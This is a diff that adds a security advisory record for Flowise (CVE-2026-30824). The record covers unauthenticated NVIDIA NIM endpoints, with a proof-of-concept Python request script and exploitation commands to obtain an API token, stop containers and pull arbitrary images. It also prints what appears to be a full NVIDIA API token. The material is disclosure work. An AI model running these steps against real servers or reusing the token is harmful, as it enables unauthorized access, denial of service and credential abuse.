@@ -1,0 +1,301 @@
+advisory_id: GHSA-5f53-522j-j454
+datasource_id: github_osv/GHSA-5f53-522j-j454
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-5f53-522j-j454/GHSA-5f53-522j-j454.json
+aliases:
+  - CVE-2026-30824
+summary: |
+  Flowise Missing Authentication on NVIDIA NIM Endpoints
+  # Missing Authentication on NVIDIA NIM Endpoints
+
+  ## Summary
+
+  The NVIDIA NIM router (`/api/v1/nvidia-nim/*`) is whitelisted in the global authentication middleware, allowing unauthenticated access to privileged container management and token generation endpoints.
+
+  ## Vulnerability Details
+
+  | Field | Value |
+  |-------|-------|
+  | CWE | CWE-306: Missing Authentication for Critical Function |
+  | Affected File | `packages/server/src/utils/constants.ts` |
+  | Affected Line | Line 20 (`'/api/v1/nvidia-nim'` in `WHITELIST_URLS`) |
+  | CVSS 3.1 | 8.6 (High) |
+
+  ## Root Cause
+
+  In `packages/server/src/utils/constants.ts`, the NVIDIA NIM route is added to the authentication whitelist:
+
+  ```typescript
+  export const WHITELIST_URLS = [
+      // ... other URLs
+      '/api/v1/nvidia-nim',  // Line 20 - bypasses JWT/API-key validation
+      // ...
+  ]
+  ```
+
+  This causes the global auth middleware to skip authentication checks for all endpoints under `/api/v1/nvidia-nim/*`. None of the controller actions in `packages/server/src/controllers/nvidia-nim/index.ts` perform their own authentication checks.
+
+  ## Affected Endpoints
+
+  | Method | Endpoint | Risk |
+  |--------|----------|------|
+  | GET | `/api/v1/nvidia-nim/get-token` | Leaks valid NVIDIA API token |
+  | GET | `/api/v1/nvidia-nim/preload` | Resource consumption |
+  | GET | `/api/v1/nvidia-nim/download-installer` | Resource consumption |
+  | GET | `/api/v1/nvidia-nim/list-running-containers` | Information disclosure |
+  | POST | `/api/v1/nvidia-nim/pull-image` | Arbitrary image pull |
+  | POST | `/api/v1/nvidia-nim/start-container` | Arbitrary container start |
+  | POST | `/api/v1/nvidia-nim/stop-container` | Denial of Service |
+  | POST | `/api/v1/nvidia-nim/get-image` | Information disclosure |
+  | POST | `/api/v1/nvidia-nim/get-container` | Information disclosure |
+
+  ## Impact
+
+  ### 1. NVIDIA API Token Leakage
+
+  The `/get-token` endpoint returns a valid NVIDIA API token without authentication. This token grants access to NVIDIA's inference API and can list 170+ LLM models.
+
+  **Token obtained:**
+  ```json
+  {
+    "access_token": "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",
+    "token_type": "Bearer",
+    "expires_in": 3600
+  }
+  ```
+
+  **Token validation:**
+  ```bash
+  curl -H "Authorization: Bearer nvapi-GT-..." https://integrate.api.nvidia.com/v1/models
+  # Returns list of 170+ available models
+  ```
+
+  ### 2. Container Runtime Manipulation
+
+  On systems with Docker/NIM installed, an unauthenticated attacker can:
+  - List running containers (reconnaissance)
+  - Stop containers (Denial of Service)
+  - Start containers with arbitrary images
+  - Pull arbitrary Docker images (resource consumption, potential malicious images)
+
+  ## Proof of Concept
+
+  ### poc.py
+
+  ```python
+  #!/usr/bin/env python3
+  """
+  POC: Privileged NVIDIA NIM endpoints are unauthenticated
+
+  Usage:
+    python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/get-token
+  """
+
+  import argparse
+  import urllib.request
+  import urllib.error
+
+  def main():
+      ap = argparse.ArgumentParser()
+      ap.add_argument("--target", required=True, help="Base URL, e.g. http://host:port")
+      ap.add_argument("--path", required=True, help="NIM endpoint path")
+      ap.add_argument("--method", default="GET", choices=["GET", "POST"])
+      ap.add_argument("--data", default="", help="Raw request body for POST")
+      args = ap.parse_args()
+
+      url = args.target.rstrip("/") + "/" + args.path.lstrip("/")
+      body = args.data.encode("utf-8") if args.method == "POST" else None
+      req = urllib.request.Request(
+          url,
+          data=body,
+          method=args.method,
+          headers={"Content-Type": "application/json"} if body else {},
+      )
+
+      try:
+          with urllib.request.urlopen(req, timeout=10) as r:
+              print(r.read().decode("utf-8", errors="replace"))
+      except urllib.error.HTTPError as e:
+          print(e.read().decode("utf-8", errors="replace"))
+
+  if __name__ == "__main__":
+      main()
+  ```
+
+  <img width="1581" height="595" alt="screenshot" src="https://github.com/user-attachments/assets/85351a88-64ce-4e2c-8e67-98f217fcf989" />
+
+  ### Exploitation Steps
+
+  ```bash
+  # 1. Obtain NVIDIA API token (no authentication required)
+  python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/get-token
+
+  # 2. List running containers
+  python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/list-running-containers
+
+  # 3. Stop a container (DoS)
+  python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/stop-container \
+    --method POST --data '{"containerId":"<target_id>"}'
+
+  # 4. Pull arbitrary image
+  python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/pull-image \
+    --method POST --data '{"imageTag":"malicious/image","apiKey":"any"}'
+  ```
+
+  ### Evidence
+
+  **Token retrieval without authentication:**
+  ```
+  $ python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/get-token
+  {"access_token":"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","token_type":"Bearer","refresh_token":null,"expires_in":3600,"id_token":null}
+  ```
+
+  **Token grants access to NVIDIA API:**
+  ```
+  $ curl -H "Authorization: Bearer nvapi-GT-..." https://integrate.api.nvidia.com/v1/models
+  {"object":"list","data":[{"id":"01-ai/yi-large",...},{"id":"meta/llama-3.1-405b-instruct",...},...]}
+  ```
+
+  **Container endpoints return 500 (not 401) proving auth bypass:**
+  ```
+  $ python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/list-running-containers
+  {"statusCode":500,"success":false,"message":"Container runtime client not available","stack":{}}
+  ```
+
+  ## References
+
+  - [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
+  - [OWASP API Security Top 10 - API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
+impacted_packages:
+  - purl: pkg:npm/flowise
+    affected_versions: vers:npm/<=3.0.12
+    fixed_versions: vers:npm/3.0.13
+    affected_packages:
+      - pkg:npm/flowise@1.0.0
+      - pkg:npm/flowise@1.0.1
+      - pkg:npm/flowise@1.1.0
+      - pkg:npm/flowise@1.1.1
+      - pkg:npm/flowise@1.2.1
+      - pkg:npm/flowise@1.2.2
+      - pkg:npm/flowise@1.2.3
+      - pkg:npm/flowise@1.2.4
+      - pkg:npm/flowise@1.2.5
+      - pkg:npm/flowise@1.2.6
+      - pkg:npm/flowise@1.2.7
+      - pkg:npm/flowise@1.2.8
+      - pkg:npm/flowise@1.2.9
+      - pkg:npm/flowise@1.2.10
+      - pkg:npm/flowise@1.2.11
+      - pkg:npm/flowise@1.2.12
+      - pkg:npm/flowise@1.2.13
+      - pkg:npm/flowise@1.2.14
+      - pkg:npm/flowise@1.2.15
+      - pkg:npm/flowise@1.2.16
+      - pkg:npm/flowise@1.3.0
+      - pkg:npm/flowise@1.3.1
+      - pkg:npm/flowise@1.3.2
+      - pkg:npm/flowise@1.3.3
+      - pkg:npm/flowise@1.3.4
+      - pkg:npm/flowise@1.3.5
+      - pkg:npm/flowise@1.3.6
+      - pkg:npm/flowise@1.3.7
+      - pkg:npm/flowise@1.3.8-rc.1
+      - pkg:npm/flowise@1.3.8
+      - pkg:npm/flowise@1.3.9
+      - pkg:npm/flowise@1.4.0-rc.1
+      - pkg:npm/flowise@1.4.0
+      - pkg:npm/flowise@1.4.1
+      - pkg:npm/flowise@1.4.2
+      - pkg:npm/flowise@1.4.3
+      - pkg:npm/flowise@1.4.4
+      - pkg:npm/flowise@1.4.5
+      - pkg:npm/flowise@1.4.6
+      - pkg:npm/flowise@1.4.7
+      - pkg:npm/flowise@1.4.8
+      - pkg:npm/flowise@1.4.9
+      - pkg:npm/flowise@1.4.10
+      - pkg:npm/flowise@1.4.11
+      - pkg:npm/flowise@1.4.12
+      - pkg:npm/flowise@1.5.0
+      - pkg:npm/flowise@1.5.1
+      - pkg:npm/flowise@1.6.0
+      - pkg:npm/flowise@1.6.1
+      - pkg:npm/flowise@1.6.2
+      - pkg:npm/flowise@1.6.3
+      - pkg:npm/flowise@1.6.4
+      - pkg:npm/flowise@1.6.5
+      - pkg:npm/flowise@1.6.6
+      - pkg:npm/flowise@1.7.1
+      - pkg:npm/flowise@1.7.2
+      - pkg:npm/flowise@1.8.0
+      - pkg:npm/flowise@1.8.1
+      - pkg:npm/flowise@1.8.2
+      - pkg:npm/flowise@1.8.3
+      - pkg:npm/flowise@1.8.4
+      - pkg:npm/flowise@2.0.0
+      - pkg:npm/flowise@2.0.1
+      - pkg:npm/flowise@2.0.2
+      - pkg:npm/flowise@2.0.3
+      - pkg:npm/flowise@2.0.4
+      - pkg:npm/flowise@2.0.5
+      - pkg:npm/flowise@2.0.6
+      - pkg:npm/flowise@2.0.7
+      - pkg:npm/flowise@2.1.0
+      - pkg:npm/flowise@2.1.1
+      - pkg:npm/flowise@2.1.2
+      - pkg:npm/flowise@2.1.3
+      - pkg:npm/flowise@2.1.4
+      - pkg:npm/flowise@2.1.5
+      - pkg:npm/flowise@2.2.0
+      - pkg:npm/flowise@2.2.1
+      - pkg:npm/flowise@2.2.2
+      - pkg:npm/flowise@2.2.3
+      - pkg:npm/flowise@2.2.4
+      - pkg:npm/flowise@2.2.5
+      - pkg:npm/flowise@2.2.6-hotfix.1
+      - pkg:npm/flowise@2.2.6
+      - pkg:npm/flowise@2.2.7-patch.1
+      - pkg:npm/flowise@2.2.7
+      - pkg:npm/flowise@2.2.8
+      - pkg:npm/flowise@3.0.0
+      - pkg:npm/flowise@3.0.1
+      - pkg:npm/flowise@3.0.2
+      - pkg:npm/flowise@3.0.3
+      - pkg:npm/flowise@3.0.4
+      - pkg:npm/flowise@3.0.5
+      - pkg:npm/flowise@3.0.6
+      - pkg:npm/flowise@3.0.7
+      - pkg:npm/flowise@3.0.8
+      - pkg:npm/flowise@3.0.10
+      - pkg:npm/flowise@3.0.11
+      - pkg:npm/flowise@3.0.12
+    fixed_packages:
+      - pkg:npm/flowise@3.0.13
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-5f53-522j-j454/GHSA-5f53-522j-j454.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-306
+references:
+  - url: https://github.com/FlowiseAI/Flowise
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.13
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-30824
+    reference_type:
+    reference_id: CVE-2026-30824
+  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5f53-522j-j454
+    reference_type:
+    reference_id: GHSA-5f53-522j-j454
+exploits: []
